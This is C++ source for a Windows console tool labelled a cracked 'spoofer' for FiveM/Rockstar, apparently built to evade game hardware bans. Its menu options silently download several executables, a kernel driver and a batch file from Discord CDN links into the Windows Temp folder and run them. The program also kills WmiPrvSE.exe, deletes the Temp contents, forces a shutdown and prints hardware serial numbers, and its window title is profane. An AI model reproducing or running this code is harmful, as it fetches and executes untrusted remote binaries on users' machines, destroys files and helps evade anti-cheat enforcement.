#include <iostream>
#include <Windows.h>

using namespace std;

int main() {
p1:
	SetConsoleTitleA("Fuck you");
	system("color 4");
	system("cls");
	cout << "   _______  _______  __   __  __   __ \n";
	cout << "  |       ||       ||  |_|  ||  |_|  |\n";
	cout << "  |    ___||   _   ||       ||       |\n";
	cout << "  |   |___ |  | |  ||       ||       |\n";
	cout << "  |    ___||  |_|  | |     |  |     | \n";
	cout << "  |   |    |       ||   _   ||   _   |\n";
	cout << "  |___|    |_______||__| |__||__| |__|\n";
	cout << "  Spoofer cracked | Foxx#8168 | PEDRIN#0001\n\n";
	cout << "  [1] Spoof\n";
	cout << "  [2] Clean Rockstar\n";
	cout << "  [3] Test\n";
	cout << "  [4] Extra\n";
	cout << "  User: ";
	int res1;
	cin >> res1;
	if (res1 == 1) {
		system("cls");
		cout << "  Baixando arquivos!!!";
		system("curl https://cdn.discordapp.com/attachments/891481257861591073/957358818164105296/CLEANER_PERM.exe --output C:/Windows/Temp/cp1.exe >nul 2>&1");
		system("curl https://cdn.discordapp.com/attachments/891481257861591073/957358817375555604/CLEANER_PERM2.exe --output C:/Windows/Temp/cp2.exe >nul 2>&1");
		system("curl https://cdn.discordapp.com/attachments/891481257861591073/957358817753038969/FiveM_PERM.exe --output C:/Windows/Temp/f1.exe >nul 2>&1");
		system("curl https://cdn.discordapp.com/attachments/891481257861591073/957358817962774648/FiveM_PERM.sys --output C:/Windows/Temp/f1.sys >nul 2>&1");
		system("curl https://cdn.discordapp.com/attachments/891481257861591073/957358848769941504/GPU.exe --output C:/Windows/Temp/gp.exe >nul 2>&1");
		system("start C:/Windows/Temp/f1.exe C:/Windows/Temp/f1.sys");
		system("TASKKILL /F /IM WmiPrvSE.exe");
		system("cls");
		system("start C:/Windows/Temp/cp1.exe");
		system("start C:/Windows/Temp/cp2.exe");
		system("start C:/Windows/Temp/gp.exe");
		system("cd C:\Windows\Temp");
		system("del * /Q");
		system("cls");
		system("start https://discord.gg/8wNDEERzBW");
		cout << "  50 segundos para reiniciar!!!";
		system("  timeout 50");
		system("shutdown -f -c -t 0");
	}
	else if (res1 == 2) {
		system("cls");
		system("curl https://cdn.discordapp.com/attachments/891481257861591073/957387005426298970/cleanner.bat --output C:/Windows/Temp/clss.bat >nul 2>&1");
		system("start C:/Windows/Temp/clss.bat");
		system("cls");
		Sleep(3000);
		goto p1;

	}
	else if (res1 == 3) {
		system("cls");

		system("color 3");

		system("echo Diskdrive :");
		system("wmic diskdrive get serialnumber");

		system("	echo Bios :");
		system("wmic bios get serialnumber");

		system("	echo CPU :");
		system("wmic cpu get serialnumber");

		system("	echo Baseboard :");
		system("wmic baseboard get serialnumber");

		system("	echo Memorychip :");
		system("wmic memorychip get serialnumber");

		system("	echo Monitor :");
		system("wmic desktopmonitor get Caption, MonitorType, MonitorManufacturer, Name");

		system("pause");
		goto p1;
	}
	else if (res1 == 4) {
		system("cls");
		system("start https://discord.gg/8wNDEERzBW");
		system("start https://www.youtube.com/TheFoxx");
		goto p1;
	}
	else {
		system("cls");
		cout << "Opc errada!!!";
		Sleep(3000);
		goto p1;
	}
	return 0;
}